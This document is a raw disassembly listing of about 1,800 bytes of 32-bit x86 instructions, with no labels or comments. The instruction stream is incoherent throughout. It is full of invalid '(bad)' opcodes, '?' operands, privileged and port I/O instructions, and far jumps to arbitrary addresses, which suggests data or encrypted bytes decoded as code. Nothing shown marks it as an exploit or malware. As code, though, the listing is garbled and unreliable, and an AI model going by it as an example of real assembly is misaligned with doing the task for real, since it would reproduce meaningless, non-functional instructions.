  41147b:	aaa    
  41147c:	cwde   
  41147d:	ret    0x35a5
  411480:	push   cs
  411481:	inc    ebp
  411482:	test   BYTE PTR [ebp+0x1a89d354],ch
  411488:	xchg   esp,eax
  411489:	mov    ds:0x209ed2e1,al
  41148e:	pop    ebx
  41148f:	mov    esi,DWORD PTR [eax-0x302af62e]
  411495:	mov    dl,0x8a
  411497:	loope  0x411424
  411499:	bound  ecx,QWORD PTR [eax]
  41149b:	xchg   edi,eax
  41149c:	xchg   edi,eax
  41149d:	pop    edx
  41149e:	xchg   esi,eax
  41149f:	cmc    
  4114a0:	clc    
  4114a1:	aaa    
  4114a2:	or     al,0xac
  4114a4:	icebp  
  4114a5:	pop    ss
  4114a6:	fisttp QWORD PTR [edx+0x58dcacab]
  4114ac:	push   edx
  4114ad:	cmp    eax,0xa0e99fe3
  4114b2:	fabs   
  4114b4:	sahf   
  4114b5:	pop    ecx
  4114b6:	sub    DWORD PTR ds:0xf9e95d2f,edi
  4114bc:	sbb    al,0x54
  4114be:	jbe    0x411445
  4114c0:	inc    esp
  4114c1:	pop    eax
  4114c2:	imul   esp,DWORD PTR [eax-0x5b],0x302b65d
  4114c9:	jbe    0x4114e0
  4114cb:	out    0x18,eax
  4114cd:	sub    DWORD PTR [edi+0x4a],0x12
  4114d1:	adc    al,BYTE PTR [ebp-0x1e44da34]
  4114d7:	sub    BYTE PTR [edi-0x5],0x84
  4114db:	(bad)
  4114de:	sahf   
  4114df:	inc    esp
  4114e0:	dec    DWORD PTR [ebp-0x24]
  4114e3:	adc    ecx,ebx
  4114e5:	xor    edx,ecx
  4114e7:	xchg   edx,eax
  4114e8:	popa   
  4114e9:	adc    BYTE PTR [edx+0x38],ah
  4114ec:	sbb    eax,0x53e32b7c
  4114f1:	out    dx,eax
  4114f2:	dec    edi
  4114f3:	inc    ebp
  4114f4:	pop    ecx
  4114f5:	int3   
  4114f6:	rcl    DWORD PTR [esi-0x20],cl
  4114f9:	shr    BYTE PTR [ebx-0x1b],1
  4114fc:	neg    DWORD PTR [ebx]
  4114fe:	mov    ds:0x48c9d36b,eax
  411503:	ss pushf 
  411505:	sbb    edx,edi
  411507:	inc    ebx
  411508:	add    DWORD PTR [eax-0x49089bef],0xffffffc9
  41150f:	cmc    
  411510:	outs   dx,DWORD PTR ds:[esi]
  411511:	push   0xffffffc6
  411513:	(bad)  
  411514:	cli    
  411515:	mov    BYTE PTR [edx+0x5a],cl
  411518:	aas    
  411519:	lds    edi,FWORD PTR [edi]
  41151b:	fs pop ebx
  41151d:	les    ecx,FWORD PTR [ebp+0x50742309]
  411523:	scas   al,BYTE PTR es:[edi]
  411524:	xor    eax,0xf8b04c64
  411529:	push   edx
  41152a:	das    
  41152b:	xlat   BYTE PTR ds:[ebx]
  41152c:	sbb    BYTE PTR [ebp+0x2],dh
  41152f:	(bad)  
  411530:	aaa    
  411531:	pop    ebp
  411532:	test   al,0xc8
  411534:	add    esp,DWORD PTR [esi-0x7b]
  411537:	add    BYTE PTR [ecx],bh
  411539:	sbb    DWORD PTR [ecx],eax
  41153b:	(bad)  
  41153c:	mov    WORD PTR [edx+0x45],?
  41153f:	push   es
  411540:	test   al,0x89
  411542:	adc    ecx,0x92540ab6
  411548:	popf   
  411549:	ds (bad) 
  41154b:	outs   dx,BYTE PTR ds:[esi]
  41154c:	mov    cl,0xe3
  41154e:	addr16 push ds
  411550:	cmp    esp,DWORD PTR [esi+0x78]
  411553:	and    al,0x7f
  411555:	pop    ss
  411556:	adc    dh,BYTE PTR [ebx+0x7b]
  411559:	cmp    BYTE PTR [edi],ch
  41155b:	push   ds
  41155c:	xchg   DWORD PTR [ebp-0x49],eax
  41155f:	mov    bl,0x28
  411561:	xor    DWORD PTR [edx],eax
  411563:	dec    eax
  411564:	hlt    
  411565:	mov    BYTE PTR [esi],ch
  411567:	inc    ecx
  411568:	add    BYTE PTR [esi],dh
  41156a:	in     eax,dx
  41156b:	sbb    ecx,DWORD PTR [esi]
  41156d:	mov    bl,0xf
  41156f:	mov    edx,0xdbe84ca5
  411574:	in     eax,0x97
  411576:	rcr    al,0x64
  411579:	adc    dl,0xe3
  41157c:	xchg   ecx,eax
  41157d:	mov    eax,ds:0xf1649c6
  411582:	adc    DWORD PTR ds:0xa8873130,eax
  411588:	adc    edi,DWORD PTR [ebp-0x491e78c5]
  41158e:	jmp    0x283a:0x54b1594d
  411595:	in     al,dx
  411596:	xchg   BYTE PTR [ecx+eax*2-0x1d],bh
  41159a:	stc    
  41159b:	jb     0x411591
  41159d:	jae    0x41158f
  41159f:	rep ins BYTE PTR es:[edi],dx
  4115a1:	out    0x59,al
  4115a3:	call   0xb975d1e4
  4115a8:	mov    esp,0x87ba7062
  4115ad:	add    edi,DWORD PTR [esi-0x61]
  4115b0:	loope  0x4115bd
  4115b2:	xchg   edx,eax
  4115b3:	fadd   st,st(0)
  4115b5:	mov    cs,WORD PTR [ebp+0x3b21f8d8]
  4115bb:	mov    bl,0xcf
  4115bd:	jmp    0x411632
  4115bf:	sbb    al,0x94
  4115c1:	popf   
  4115c2:	xor    DWORD PTR [esi+ebp*2-0x1b82104d],ecx
  4115c9:	fadd   DWORD PTR [edx]
  4115cb:	fsubr  st,st(1)
  4115cd:	loop   0x411648
  4115cf:	outs   dx,BYTE PTR ds:[esi]
  4115d0:	inc    eax
  4115d1:	dec    esi
  4115d2:	dec    edx
  4115d3:	push   0xd18c55a3
  4115d8:	mul    dl
  4115da:	pop    edx
  4115db:	inc    esp
  4115dc:	data16 cmp bh,BYTE PTR [eax+0x79]
  4115e0:	ss stos DWORD PTR es:[edi],eax
  4115e2:	fcomi  st,st(4)
  4115e4:	std    
  4115e5:	pop    ecx
  4115e6:	push   ebx
  4115e7:	mov    BYTE PTR [eax+ebp*2+0x5a393db7],ah
  4115ee:	pop    es
  4115ef:	and    bh,BYTE PTR [edx]
  4115f1:	cmp    eax,0xcb07bd1a
  4115f6:	fimul  WORD PTR [edx-0x47]
  4115f9:	nop
  4115fa:	das    
  4115fb:	or     esp,0x30
  4115fe:	gs retf 0x2e6f
  411602:	scas   al,BYTE PTR es:[edi]
  411603:	add    al,0xec
  411605:	je     0x41165d
  411607:	mov    dh,0x25
  411609:	mov    ch,BYTE PTR [ecx-0xb]
  41160c:	iret   
  41160d:	adc    eax,0xe96245b8
  411612:	jge    0x41161e
  411614:	retf   0x4ad9
  411617:	lahf   
  411618:	jl     0x411646
  41161a:	pop    DWORD PTR [edi-0x4594145]
  411620:	jp     0x411699
  411622:	sbb    BYTE PTR [edi-0x61],bh
  411625:	pop    ax
  411627:	jno    0x41167c
  411629:	adc    eax,0x3aa2f11a
  41162e:	loope  0x411646
  411630:	pushf  
  411631:	mov    al,ds:0xb1ecb13b
  411636:	pop    ds
  411637:	inc    esi
  411638:	scas   eax,DWORD PTR es:[edi]
  411639:	mov    ecx,0x3255560c
  41163e:	pushf  
  41163f:	pop    ds
  411640:	push   ecx
  411641:	push   ds
  411642:	jno    0x4115f9
  411644:	or     cl,bl
  411646:	inc    ebp
  411647:	int3   
  411648:	mov    esi,0xdae252b
  41164d:	ds xor eax,0x97586cf5
  411653:	add    DWORD PTR [eax],edx
  411655:	xor    al,0xaa
  411657:	or     ch,BYTE PTR [edx]
  411659:	pop    es
  41165a:	pop    es
  41165b:	lods   al,BYTE PTR ds:[esi]
  41165c:	dec    DWORD PTR [esi]
  41165e:	jg     0x4116bd
  411660:	inc    esp
  411661:	clc    
  411662:	ss sbb ebx,ecx
  411665:	dec    edx
  411666:	ficom  DWORD PTR [eax]
  411668:	cmp    BYTE PTR [eax+0x106fcb1a],ah
  41166e:	add    dl,BYTE PTR [eax+0x519ef973]
  411674:	dec    ebx
  411675:	sbb    ebx,DWORD PTR [edx]
  411677:	int3   
  411678:	add    ch,BYTE PTR [esi]
  41167a:	cmp    ebx,DWORD PTR [eax-0x591a6fcc]
  411680:	mov    bl,0xa2
  411682:	jno    0x4116ed
  411684:	jmp    0x393d:0xa20c9986
  41168b:	dec    ebx
  41168c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41168d:	add    ch,al
  41168f:	inc    edi
  411690:	jne    0x411636
  411692:	vpunpckhbw xmm4,xmm7,XMMWORD PTR [ecx+0x61ac217b]
  41169a:	dec    ebx
  41169b:	or     BYTE PTR [eax+0x1f53ca3a],bl
  4116a1:	add    DWORD PTR [edi-0x6755c530],ebp
  4116a7:	aaa    
  4116a8:	ins    BYTE PTR es:[edi],dx
  4116a9:	sbb    dh,cl
  4116ab:	out    dx,al
  4116ac:	test   DWORD PTR [edi+0x5ab73878],eax
  4116b2:	jl     0x411665
  4116b4:	(bad)  
  4116b5:	cdq    
  4116b6:	add    al,0xf4
  4116b8:	in     al,dx
  4116b9:	add    eax,0x4c0c581e
  4116be:	push   ebp
  4116bf:	or     DWORD PTR [eax+0x38538264],edi
  4116c5:	aam    0x8
  4116c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c8:	sub    DWORD PTR [esi-0x707091a8],eax
  4116ce:	pop    edi
  4116cf:	div    DWORD PTR [esi+0x43641ba]
  4116d5:	inc    ecx
  4116d6:	jne    0x41166b
  4116d8:	div    BYTE PTR [esi-0x7f9fbd5d]
  4116de:	or     cl,dh
  4116e0:	js     0x4116a0
  4116e2:	retf   0x88da
  4116e5:	bound  ecx,QWORD PTR [edi]
  4116e7:	out    0x9f,al
  4116e9:	cmp    esi,eax
  4116eb:	(bad)  
  4116ec:	ds pop edi
  4116ee:	push   edx
  4116ef:	loopne 0x411705
  4116f1:	add    cl,BYTE PTR [edi]
  4116f3:	push   ebp
  4116f4:	xchg   ecx,eax
  4116f5:	xor    bl,BYTE PTR ds:0x13b284f2
  4116fb:	jne    0x411707
  4116fd:	xchg   DWORD PTR [ebx+ecx*1],esp
  411700:	and    ecx,DWORD PTR [eax]
  411702:	dec    ebx
  411703:	ss fwait
  411705:	sbb    ecx,DWORD PTR gs:[ebp-0x2cf7af96]
  41170c:	jb     0x41170f
  41170e:	inc    eax
  41170f:	(bad)  
  411710:	mov    ecx,0xe89dd2b0
  411715:	mov    WORD PTR [edx-0x4a],ss
  411718:	xor    BYTE PTR [eax],bh
  41171a:	push   ds
  41171b:	fucomip st,st(4)
  41171d:	popa   
  41171e:	lds    ecx,FWORD PTR [ecx+0x2307cfa]
  411724:	sahf   
  411725:	mov    dl,0x74
  411727:	sub    ebx,0x2d0d0f4a
  41172d:	outs   dx,BYTE PTR ds:[esi]
  41172e:	aad    0xf
  411730:	pop    di
  411732:	test   eax,0xa177932c
  411737:	cmc    
  411738:	dec    edi
  411739:	adc    BYTE PTR [ecx],dh
  41173b:	fwait
  41173c:	pusha  
  41173d:	and    edx,DWORD PTR [ebx]
  41173f:	stos   DWORD PTR es:[edi],eax
  411740:	xor    al,0x1c
  411742:	fisttp QWORD PTR [ebx]
  411744:	mov    dl,0x16
  411746:	out    0x21,al
  411748:	sbb    esp,DWORD PTR [eax-0x77f9841b]
  41174e:	mov    al,ds:0x3d597cf1
  411753:	je     0x41171b
  411755:	or     esi,DWORD PTR [edx+ecx*8-0x6c8a2ed0]
  41175c:	sbb    eax,0xebaabf50
  411761:	test   DWORD PTR [ecx],0x37b63605
  411767:	mov    cs,WORD PTR [edx-0x619afbe9]
  41176d:	sbb    ch,ah
  41176f:	fcmovnbe st,st(5)
  411771:	pushf  
  411772:	fidivr WORD PTR [eax-0x48563d1e]
  411778:	adc    eax,edi
  41177a:	imul   edx,DWORD PTR [edi],0x65bfc92b
  411780:	pop    eax
  411781:	mov    ds:0x789ec251,al
  411786:	into   
  411787:	push   esp
  411788:	loope  0x411714
  41178a:	jmp    0x41172f
  41178c:	mov    ecx,0x55365e4a
  411791:	dec    eax
  411792:	ret    0x33e
  411795:	fs mov edi,0x534402d4
  41179b:	pop    ds
  41179c:	or     al,0x34
  41179e:	cmc    
  41179f:	and    cl,ch
  4117a1:	push   esi
  4117a2:	loope  0x41172e
  4117a4:	stos   DWORD PTR es:[edi],eax
  4117a5:	fbstp  TBYTE PTR [ebp+ebx*8-0x7b]
  4117a9:	loopne 0x411760
  4117ab:	jge    0x411816
  4117ad:	sub    ah,dh
  4117af:	sti    
  4117b0:	div    DWORD PTR [ebp-0x3e9cb01d]
  4117b6:	add    cl,BYTE PTR [ebp-0x412f945b]
  4117bc:	lock adc BYTE PTR [esi+eiz*8],bh
  4117c0:	add    DWORD PTR [edi],0xffffffcf
  4117c3:	popf   
  4117c4:	retf   
  4117c5:	push   esp
  4117c6:	pop    esi
  4117c7:	div    edx
  4117c9:	fnstenv [eax+edi*4+0x48c041b7]
  4117d0:	push   ecx
  4117d1:	jo     0x411784
  4117d3:	xchg   BYTE PTR [edx],cl
  4117d5:	mov    gs,edx
  4117d7:	ss rol ebx,1
  4117da:	adc    al,0xf8
  4117dc:	adc    eax,DWORD PTR [ebx+eax*2-0x4b]
  4117e0:	inc    eax
  4117e1:	js     0x411777
  4117e3:	das    
  4117e4:	aad    0xa5
  4117e6:	test   BYTE PTR [ecx+eiz*1+0x4ae72ae7],dl
  4117ed:	cmp    BYTE PTR [ebp+0x7a284be3],al
  4117f3:	(bad)  [eax+0x5f]
  4117f6:	out    dx,al
  4117f7:	push   edi
  4117f8:	inc    ecx
  4117f9:	data16 mov al,0x1
  4117fc:	xor    BYTE PTR [edi+0x558b2b1a],ah
  411802:	(bad)  
  411803:	jp     0x411798
  411805:	ret    
  411806:	xchg   edx,eax
  411807:	mov    al,ds:0x49f0ee7a
  41180c:	ss addr16 es pop ebx
  411810:	das    
  411811:	push   ecx
  411812:	add    bh,BYTE PTR [edi]
  411814:	mov    WORD PTR [ebp-0x36],ss
  411817:	and    dl,bh
  411819:	(bad)  
  41181b:	xchg   ebx,eax
  41181c:	outs   dx,BYTE PTR ds:[esi]
  41181d:	mov    esp,0xbb66d474
  411822:	pop    esi
  411823:	ret    0xd81d
  411826:	push   ebp
  411827:	xor    ah,dl
  411829:	jp     0x411820
  41182b:	jp     0x411830
  41182d:	dec    edx
  41182e:	xor    BYTE PTR [esi-0x7d],0x18
  411832:	iret   
  411833:	or     DWORD PTR [ebp+0x56c6cd17],eax
  411839:	jno    0x4118ac
  41183b:	and    edx,DWORD PTR [ebx-0xf]
  41183e:	mov    ds,WORD PTR [ecx]
  411840:	push   ss
  411841:	xor    eax,0xfdfcb230
  411846:	call   0x8f4bb8a3
  41184b:	lods   eax,DWORD PTR ds:[esi]
  41184c:	mov    dl,0x75
  41184e:	pop    eax
  41184f:	rcl    BYTE PTR [esi+0x67],cl
  411852:	xor    eax,0x2568f052
  411857:	inc    ebp
  411858:	xlat   BYTE PTR ds:[ebx]
  411859:	inc    ebp
  41185a:	xor    ecx,esi
  41185c:	push   ss
  41185d:	pop    edi
  41185e:	jl     0x411897
  411860:	mov    ds:0xf29b0d4d,eax
  411865:	adc    al,0xee
  411867:	daa    
  411868:	hlt    
  411869:	cwde   
  41186a:	iretw  
  41186c:	adc    al,0xac
  41186e:	mov    edi,0xae71a586
  411873:	std    
  411874:	sub    eax,ecx
  411876:	xor    dl,BYTE PTR [ecx]
  411878:	in     eax,dx
  411879:	mov    ebx,0x32364c2b
  41187e:	push   ebp
  41187f:	lock repz mov edi,0xceabc15e
  411886:	retf   0x18bf
  411889:	pop    esp
  41188a:	mov    ebp,0x40198cb4
  41188f:	jne    0x411816
  411891:	mov    ?,ebx
  411893:	mov    eax,ds:0x1abd2610
  411898:	add    ch,BYTE PTR [ebx+0x205f4261]
  41189e:	aad    0x4f
  4118a0:	push   ebx
  4118a1:	iret   
  4118a2:	into   
  4118a3:	push   esp
  4118a4:	cdq    
  4118a5:	ret    
  4118a6:	daa    
  4118a7:	nop
  4118a8:	cmp    al,0x9a
  4118aa:	aad    0xcc
  4118ac:	cmp    al,0xcf
  4118ae:	lds    esp,FWORD PTR [ecx]
  4118b0:	xchg   esi,eax
  4118b1:	les    esp,FWORD PTR [edx]
  4118b3:	mov    ds:0x45f41bcf,eax
  4118b8:	enter  0x2a56,0xa8
  4118bc:	and    bl,cl
  4118be:	sub    esp,DWORD PTR [ebx-0x68c1a203]
  4118c4:	jp     0x4118e4
  4118c6:	aad    0x7a
  4118c8:	std    
  4118c9:	rcl    DWORD PTR [ecx-0x31],cl
  4118cc:	jp     0x4118a4
  4118ce:	xor    eax,0x715bdbb2
  4118d3:	jmp    0x1d21005c
  4118d8:	mov    ch,0x35
  4118da:	daa    
  4118db:	push   eax
  4118dc:	xor    esp,0x55206f86
  4118e2:	dec    eax
  4118e3:	scas   al,BYTE PTR es:[edi]
  4118e4:	ret    0xdefa
  4118e7:	inc    edi
  4118e8:	lods   eax,DWORD PTR ds:[esi]
  4118e9:	fidiv  WORD PTR [esi+edx*1]
  4118ec:	jge    0x411968
  4118ee:	dec    esp
  4118ef:	outs   dx,DWORD PTR ds:[esi]
  4118f0:	jge    0x411951
  4118f2:	inc    esp
  4118f3:	add    al,0x53
  4118f5:	sbb    ch,al
  4118f7:	xor    eax,DWORD PTR [eax+0x52c49ca2]
  4118fd:	sbb    ebx,DWORD PTR [ebx-0x7b32e7b0]
  411903:	lds    esp,FWORD PTR [edx]
  411905:	out    dx,eax
  411906:	xchg   ebp,eax
  411907:	push   esi
  411908:	mov    bl,0xe2
  41190a:	test   eax,0x98b3c025
  41190f:	pop    eax
  411910:	lds    esi,FWORD PTR [ebp+ecx*1-0x65]
  411914:	cmp    ecx,DWORD PTR [ebp+0xef67fcd]
  41191a:	imul   edi,DWORD PTR [edx+0x47],0xffffff9b
  41191e:	cs mov dh,0x75
  411921:	or     BYTE PTR [esi-0x78],dh
  411924:	stc    
  411925:	cwde   
  411926:	arpl   ax,si
  411928:	xor    al,0xe
  41192a:	cmp    eax,0xa3d2fff7
  41192f:	dec    esi
  411930:	lods   al,BYTE PTR es:[esi]
  411932:	pop    edi
  411933:	mov    DWORD PTR cs:[eax+eiz*8+0x5a],edi
  411938:	cli    
  411939:	out    0x61,eax
  41193b:	std    
  41193c:	stc    
  41193d:	dec    eax
  41193e:	pop    ss
  41193f:	stos   DWORD PTR es:[edi],eax
  411940:	cmp    eax,0xf02194e
  411945:	and    DWORD PTR [ebx+0x6da2b0ee],ebx
  41194b:	aas    
  41194c:	mul    BYTE PTR [esi+0x3dd7695c]
  411952:	xlat   BYTE PTR ds:[ebx]
  411953:	add    ebp,0xffffffc0
  411956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411957:	stc    
  411958:	mov    ah,0x92
  41195a:	mov    ebp,0x4397a4fc
  41195f:	into   
  411960:	mov    ds:0x48421802,eax
  411965:	fdivp  st(3),st
  411967:	adc    al,0x10
  411969:	lahf   
  41196a:	lahf   
  41196b:	aam    0x8b
  41196d:	cmc    
  41196e:	mov    cl,BYTE PTR [esi-0x1d47bae]
  411974:	xchg   ecx,eax
  411975:	out    dx,eax
  411976:	xor    DWORD PTR [edi+0x5b93f0bc],eax
  41197c:	rol    DWORD PTR [edi-0x6817742],0x48
  411983:	jmp    0x2708:0x77446072
  41198a:	ror    DWORD PTR [esi+ebx*1],0xd9
  41198e:	mov    esi,0x2cc51af2
  411993:	jne    0x4119a2
  411995:	cli    
  411996:	mov    es,eax
  411998:	scas   al,BYTE PTR es:[edi]
  411999:	lock daa 
  41199b:	rcl    BYTE PTR [edx],cl
  41199d:	in     eax,dx
  41199e:	repnz repnz add al,ch
  4119a2:	call   0xda132c72
  4119a7:	call   DWORD PTR [ecx-0x14]
  4119aa:	cdq    
  4119ab:	outs   dx,BYTE PTR ds:[esi]
  4119ac:	clc    
  4119ad:	lahf   
  4119ae:	mov    cl,0x50
  4119b0:	cmp    al,0x81
  4119b2:	in     al,dx
  4119b3:	out    0xc2,eax
  4119b5:	iret   
  4119b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119b7:	sar    DWORD PTR [ecx-0x22],cl
  4119ba:	mov    edi,0x8c6d8154
  4119bf:	add    edi,DWORD PTR [edx]
  4119c1:	and    eax,0x4612d88b
  4119c6:	sub    bh,BYTE PTR [ecx+0x5a]
  4119c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ca:	mov    dl,0x4e
  4119cc:	rcl    dh,cl
  4119ce:	mov    ch,0x73
  4119d0:	imul   edi,DWORD PTR [ebp-0x16ab2e92],0xffffffd4
  4119d7:	jg     0x411a0b
  4119d9:	inc    esp
  4119da:	std    
  4119db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119dc:	mov    esp,0xa2617e89
  4119e1:	sbb    al,0x1e
  4119e3:	cdq    
  4119e4:	jno    0x411a28
  4119e6:	ret    
  4119e7:	mov    edx,0x94205409
  4119ec:	int3   
  4119ed:	mov    esi,0xd8acdd5b
  4119f2:	in     eax,dx
  4119f3:	inc    esi
  4119f4:	cmp    al,bl
  4119f6:	push   ss
  4119f7:	popf   
  4119f8:	arpl   WORD PTR [ecx],ax
  4119fa:	jl     0x4119a4
  4119fc:	jns    0x4119b6
  4119fe:	sub    al,0xbe
  411a00:	dec    esi
  411a01:	jnp    0x4119a1
  411a03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a04:	(bad)  
  411a05:	push   ebp
  411a06:	pop    es
  411a07:	add    bl,cl
  411a09:	or     BYTE PTR [esi],0x37
  411a0c:	sub    DWORD PTR [edx+ebx*4+0x62367f16],edi
  411a13:	loope  0x411a77
  411a15:	repnz ror DWORD PTR [ecx+0x9daf4d2],0xc3
  411a1d:	out    dx,eax
  411a1e:	(bad)  
  411a20:	mov    edi,0x9df705f6
  411a25:	adc    al,0x93
  411a27:	xlat   BYTE PTR ds:[ebx]
  411a28:	or     BYTE PTR ss:[esi],0xf9
  411a2c:	ja     0x411a16
  411a2e:	cmp    BYTE PTR [ebp+0x7208f67c],ah
  411a34:	add    al,0xaf
  411a36:	dec    ecx
  411a37:	ds out 0x2c,eax
  411a3a:	push   0x461c3c63
  411a3f:	(bad)  
  411a40:	add    DWORD PTR [eax+0x3de7587d],eax
  411a46:	cwde   
  411a47:	jge    0x411a8d
  411a49:	fidiv  WORD PTR ds:0xf9cfe6ee
  411a4f:	call   FWORD PTR [ecx-0x3fa93c0a]
  411a55:	scas   eax,DWORD PTR es:[edi]
  411a56:	and    al,0xdb
  411a58:	lahf   
  411a59:	sbb    al,0x27
  411a5b:	mov    bl,0x99
  411a5d:	jbe    0x411ab2
  411a5f:	ret    0xce70
  411a62:	or     al,0x80
  411a64:	clc    
  411a65:	xchg   DWORD PTR [ebp+0x390a8d1e],ebx
  411a6b:	ficomp DWORD PTR [ebx-0x9]
  411a6e:	cmp    al,0x68
  411a70:	add    esi,DWORD PTR [ebx+0x590a6fbb]
  411a76:	mov    edx,0x798bb8a
  411a7b:	xchg   DWORD PTR [ebx],eax
  411a7d:	sar    DWORD PTR [edi-0x4c],1
  411a80:	sahf   
  411a81:	repz pop edi
  411a83:	and    BYTE PTR [ebp+0x71c8bd0c],bh
  411a89:	jo     0x411a71
  411a8b:	fst    QWORD PTR [edi+0x77]
  411a8e:	jecxz  0x411ab9
  411a90:	cmc    
  411a91:	sar    ecx,1
  411a93:	pop    esi
  411a94:	inc    eax
  411a95:	pop    ds
  411a96:	push   0xf2fa0440
  411a9b:	int    0x18
  411a9d:	mov    ecx,0x155a1b0e
  411aa2:	and    ebp,DWORD PTR [ecx-0x7a185e83]
  411aa8:	ss sbb edx,eax
  411aab:	and    eax,0xb403477c
  411ab0:	enter  0x9fdc,0x2e
  411ab4:	lahf   
  411ab5:	out    dx,al
  411ab6:	push   ebx
  411ab7:	dec    ebp
  411ab8:	push   es
  411ab9:	into   
  411aba:	or     ecx,esp
  411abc:	push   edi
  411abd:	stc    
  411abe:	inc    edi
  411abf:	or     DWORD PTR [ebp-0x51062297],esp
  411ac5:	popa   
  411ac6:	xchg   ebx,eax
  411ac7:	mov    ebx,0xc8a6fafa
  411acc:	push   edi
  411acd:	out    dx,eax
  411ace:	or     al,0x3d
  411ad0:	pusha  
  411ad1:	stos   BYTE PTR es:[edi],al
  411ad2:	pop    ecx
  411ad3:	add    ah,BYTE PTR [ebx-0x51]
  411ad6:	imul   ecx,ebx,0xffffffac
  411ad9:	sub    DWORD PTR [ecx-0x41ecee0e],0x19d15d2a
  411ae3:	sub    DWORD PTR [edi-0x64],eax
  411ae6:	xlat   BYTE PTR ds:[ebx]
  411ae7:	xchg   ebp,eax
  411ae8:	adc    al,0x39
  411aea:	adc    edi,DWORD PTR [eax]
  411aec:	data16 xor bl,BYTE PTR [ecx+0x44488e46]
  411af3:	cmp    eax,0x66530e29
  411af8:	jno    0x411b74
  411afa:	test   al,0x62
  411afc:	or     dl,al
  411afe:	pop    ecx
  411aff:	pop    ebx
  411b00:	jmp    0x5c91e0c0
  411b05:	inc    ebp
  411b06:	test   al,0xa5
  411b08:	outs   dx,BYTE PTR ds:[esi]
  411b09:	pop    ebx
  411b0a:	cmp    eax,DWORD PTR [ecx+0x3f]
  411b0d:	mov    esi,0xf8bc9aa3
  411b12:	sbb    edx,eax
  411b14:	inc    esi
  411b15:	idiv   DWORD PTR ds:0xb0f102ed
  411b1b:	imul   ebp,ecx,0x4e
  411b1e:	mov    eax,ds:0x73e3b75b
  411b23:	xchg   ebx,eax
  411b24:	jae    0x411b6f
  411b26:	or     ebx,DWORD PTR [ebx]
  411b28:	cmp    eax,0xbca8122e
  411b2d:	inc    esp
  411b2e:	dec    esi
  411b2f:	cmc    
  411b30:	mov    DWORD PTR [edx-0x680e255f],edx
  411b36:	mov    eax,ecx
  411b38:	or     al,0xee
  411b3a:	sub    al,0x49
  411b3c:	add    DWORD PTR [esi],eax
  411b3e:	arpl   WORD PTR [eax-0x5b9128e4],di
  411b44:	pop    ecx
  411b45:	mov    edx,0xa6992352
  411b4a:	sbb    al,0xc5
  411b4c:	lock shl ecx,1
  411b4f:	push   es
  411b50:	pusha  
  411b51:	xchg   edi,eax
  411b52:	pop    esp
  411b53:	cmp    DWORD PTR [edx+0x1b],0xffffff80
  411b57:	xchg   esp,eax
  411b58:	jns    0x411af5
  411b5a:	add    eax,DWORD PTR [edi]
  411b5c:	dec    edx
  411b5d:	loop   0x411bcd
  411b5f:	xchg   edi,eax
  411b60:	cmp    dl,BYTE PTR [eax]
  411b62:	daa    
  411b63:	add    DWORD PTR [eax+0x5c326ca5],ebp
  411b69:	xor    ecx,ebp
  411b6b:	cdq    
  411b6c:	or     eax,0x1ae9adfb
  411b71:	mov    ecx,0xdb6b49c7
  411b76:	sub    dl,BYTE PTR [ebx+0x60c7d247]
  411b7c:	push   esp
  411b7d:	jle    0x411b88
  411b7f:	retf   
  411b80:	in     al,0x22
  411b82:	push   es
  411b83:	cwde   
  411b84:	dec    ecx
  411b85:	aam    0xbe
  411b87:	mov    eax,ds:0x68cd5ae
  411b8c:	jg     0x411bc0
  411b8e:	sbb    ch,bl
  411b90:	ins    BYTE PTR es:[edi],dx
  411b91:	mov    DWORD PTR [edx-0x4b],0x784da9df
  411b98:	pushf  
  411b99:	sbb    eax,0xdf55d4d
  411b9e:	mov    WORD PTR [ebp+0x12],?
  411ba1:	imul   DWORD PTR [esi-0x529530ea]
  411ba7:	pop    edi
  411ba8:	or     DWORD PTR [ebp-0x2295ca26],ebp
  411bae:	in     al,0x94
  411bb0:	jne    0x411c2d
  411bb2:	mov    eax,0xd8a306b5
  411bb7:	push   ds
  411bb8:	outs   dx,BYTE PTR ds:[esi]
  411bb9:	pop    esi
  411bba:	or     DWORD PTR [eax],ebx
  411bbc:	jg     0x411c1f
  411bbe:	popa   
  411bbf:	xchg   ebp,eax
  411bc0:	sbb    eax,DWORD PTR [ecx-0x1f8ad80b]
  411bc6:	iret   
  411bc7:	popf   
  411bc8:	jl     0x411b69
  411bca:	int    0x8
  411bcc:	push   ecx
  411bcd:	xor    BYTE PTR [edx+0x1f0ea774],cl
  411bd3:	and    al,BYTE PTR [ebx-0x22]
  411bd6:	xor    BYTE PTR [edi],dh
  411bd8:	pop    ecx
  411bd9:	jnp    0x411c1f
  411bdb:	jp     0x411b65
  411bdd:	dec    esi
  411bde:	mov    edx,0xeeb28e86
  411be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411be4:	aam    0xb3
  411be6:	das    
  411be7:	push   ecx
  411be8:	adc    bl,BYTE PTR [ebx-0x7d]
  411beb:	imul   esp,DWORD PTR ds:0x6fe05c8e,0x19
  411bf2:	pop    edx
  411bf3:	xlat   BYTE PTR ds:[ebx]
  411bf4:	mov    eax,0x114d2131
  411bf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bfa:	inc    esi
  411bfb:	test   esp,eax
  411bfd:	lock mov edx,DWORD PTR [ebp-0x29]
  411c01:	jmp    0x411b8e
  411c03:	loopne 0x411bde
  411c05:	iret   
  411c06:	pop    ss
  411c07:	push   esp
  411c08:	mov    ebx,0xfeb02ec
  411c0d:	mov    bh,0x4d
  411c0f:	mul    BYTE PTR [ecx]
  411c11:	adc    ebx,DWORD PTR [esi]
  411c13:	push   edi
  411c14:	mov    esp,0xc2083b2c
  411c19:	out    0x41,eax
  411c1b:	add    eax,0xa54dc353
  411c20:	sub    eax,0x653dafe
  411c25:	lea    ebp,[eax-0x2092833f]
  411c2b:	test   al,0xad
  411c2d:	xchg   esi,eax
  411c2e:	push   esi
  411c2f:	outs   dx,BYTE PTR ds:[esi]
  411c30:	test   DWORD PTR [ecx-0x4f5a0c],esi
  411c36:	lea    ebx,[edi]
  411c38:	pop    edi
  411c39:	repz mov eax,0xd39fde0f
  411c3f:	jb     0x411c9e
  411c41:	fld    st(2)
  411c43:	rcl    ecx,0x57
  411c46:	mov    bh,0x7c
  411c48:	sub    BYTE PTR [edi],0x2c
